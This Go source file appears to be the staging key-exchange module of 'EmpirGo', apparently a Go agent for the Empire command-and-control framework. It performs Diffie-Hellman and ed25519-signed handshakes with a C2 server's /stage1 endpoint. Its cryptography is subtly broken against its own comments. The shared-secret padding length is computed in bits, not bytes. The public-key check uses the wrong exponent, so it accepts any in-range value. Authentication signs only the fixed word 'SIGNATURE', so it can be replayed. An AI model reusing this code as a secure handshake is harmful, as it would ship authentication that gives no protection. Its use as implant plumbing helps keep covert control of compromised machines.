package comms

import (
	"EmpirGo/common"
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
)

// Use standard DH parameters (6144-bit MODP Group 17)
var (
	dhPrime, _ = new(big.Int).SetString("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF", 16)
	dhBase     = big.NewInt(2)
)

// Generate DH Key Pair (matches Python behavior)
func GenerateDHKeyPair() (*big.Int, *big.Int, error) {
	privateKey, err := rand.Int(rand.Reader, dhPrime) // Secure random exponent
	if err != nil {
		return nil, nil, err
	}
	publicKey := new(big.Int).Exp(dhBase, privateKey, dhPrime) // g^x mod p
	return privateKey, publicKey, nil
}

// Validate the Public Key (matches `checkPublicKey` in Python)
func CheckPublicKey(otherKey *big.Int) bool {
	// Ensure it's within range
	if otherKey.Cmp(big.NewInt(2)) > 0 && otherKey.Cmp(new(big.Int).Sub(dhPrime, big.NewInt(1))) < 0 {
		// Verify that (otherKey^(prime-1)/2) mod prime == 1
		return new(big.Int).Exp(otherKey, new(big.Int).Sub(dhPrime, big.NewInt(1)), dhPrime).Cmp(big.NewInt(1)) == 0
	}
	return false
}

func ComputeDHSharedSecret(privateKey, serverPubKey *big.Int) ([]byte, error) {
	// Compute shared secret: (serverPub^privateKey) mod p
	sharedSecret := new(big.Int).Exp(serverPubKey, privateKey, dhPrime)
    // Print the bit length

	// Define the fixed byte length (same as the prime size)
	fixedLength := (dhPrime.BitLen()) + 3 // Convert bits to bytes

	// Properly zero-pad the shared secret
	sharedSecretBytes := make([]byte, fixedLength)
	// Print the actual value for debugging
	sharedSecret.FillBytes(sharedSecretBytes) // Ensures leading zeros are included

	// Hash using SHA-256
	hash := sha256.Sum256(sharedSecretBytes)

	return hash[:], nil
}

func sign_with_hash(message []byte, privKeyBytes []byte) []byte {
	// hash := sha512.New()
	// hash.Write(message)
	// hashedMessage := hash.Sum(nil)
	privKey := ed25519.NewKeyFromSeed(privKeyBytes)
	signature := ed25519.Sign(privKey, message)
	return signature
}

func valid_signature(message []byte, certBytes []byte, publicKeyBytes []byte) bool {
	publicKey := ed25519.PublicKey(publicKeyBytes)

	valid := ed25519.Verify(publicKey, []byte("SIGNATURE"), certBytes)
	return valid
}

func floorDiv(a, b int) int {
	result := a / b
	if (a%b != 0) && ((a < 0) != (b < 0)) {
		result -= 1
	}
	return result
}

// Perform DH Key Exchange (stagingKey encrypts header, sessionKey encrypts payload)
func PerformDHKeyExchange(server string, sessionID string, stagingKey []byte, agent_private_cert_key []byte, agent_public_cert_key []byte, server_public_cert_key []byte) ([]byte, string, []byte, error) {
	privateKey, publicKey, err := GenerateDHKeyPair()
	if err != nil {
		return nil, "", nil, fmt.Errorf("error generating DH keys: %v", err)
	}

	// Encrypt the public key before sending (matches Python's HMAC-AES encryption)
	nbytes := floorDiv((publicKey.BitLen() + 7), 8)
	clientPubBytes := publicKey.FillBytes(make([]byte, nbytes))

	//sign the word "SIGNATURE"
	agentCert := sign_with_hash([]byte("SIGNATURE"), agent_private_cert_key)

	// send our public key and agentCert to the server to verify.
	message := append(clientPubBytes, agentCert...)
	packetHandler := PacketHandler{}
	encData := common.AesEncryptThenHMAC(stagingKey, message) // Encrypt with stagingKey
	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 2, encData)

	// Send DH key exchange request
	postURL := server + "/stage1"
	resp, err := http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
	if err != nil {
		return nil, "", nil, fmt.Errorf("error sending DH exchange request: %v", err)
	}
	defer resp.Body.Close()

	// Read response from server
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, "", nil, fmt.Errorf("error reading response from server: %v", err)
	}
	parsedPackets, err := packetHandler.ParseRoutingPacket(stagingKey, responseData)
	if err != nil {
		return nil, "", nil, fmt.Errorf("error parsing routing packet: %v", err)
	}

	// Extract session ID and server's DH public key
	var newSessionID string
	for sid, packet := range parsedPackets {
		newSessionID = sid
		encData = packet[3].([]byte)
		break
	}

	data, _ := common.AesDecryptAndVerify(stagingKey, encData)

	// Extract nonce (16 bytes) and server public key (remaining bytes)
	//lengths are defined values for x509 certifactes exchange
	nonce := data[:16]
	serverPub := data[16:784]
	serverCert := data[784:848]

	// verify the server's authenticity with its cert and public cert key
	valid := valid_signature([]byte("SIGNATURE"), serverCert, server_public_cert_key)
	if !valid {
		log.Fatal("invalid signature")
	}

	// get the server's public key for DHKE, so we can derrive sessionKey
	serverPubKey := new(big.Int)
	serverPubKey.SetBytes(serverPub)

	// Compute shared secret and derive sessionKey
	sessionKey, err := ComputeDHSharedSecret(privateKey, serverPubKey)
	if err != nil {
		return nil, "", nil, fmt.Errorf("DH shared secret computation failed: %v", err)
	}

	return sessionKey, newSessionID, nonce, nil
}
